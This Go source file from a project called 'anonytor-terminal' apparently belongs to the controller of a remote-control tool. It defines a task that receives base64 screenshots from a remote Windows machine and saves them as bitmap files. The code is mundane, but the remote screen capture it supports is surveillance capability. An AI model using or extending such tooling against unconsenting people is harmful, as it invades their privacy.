package windows

import (
	"anonytor-terminal/controller/task"
	"anonytor-terminal/runtime/definition"
	"encoding/base64"
	"os"
	"path"
	"strconv"
	"time"
)

type GetScreenshotTask struct {
	task.Base
	result string
}

func (t *GetScreenshotTask) GetCmdType() definition.Cmd {
	return definition.GetScreenshot
}

func (t *GetScreenshotTask) OnTaskFinished(data string) {
	t.Status = definition.TaskFinished
	p := path.Join("./static", strconv.Itoa(int(time.Now().Unix()))+t.ID+".bmp")
	f, err := os.Create(p)
	if err != nil {
		t.Status = definition.TaskErrorInExecution
		return
	}
	defer f.Close()
	content, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		t.Status = definition.TaskErrorInExecution
		return
	}
	_, err = f.Write(content)
	if err != nil {
		t.Status = definition.TaskErrorInExecution
		return
	}
	t.Status = definition.TaskFinished
	t.result = p
}

func (t *GetScreenshotTask) GetResult() string {
	return t.result
}
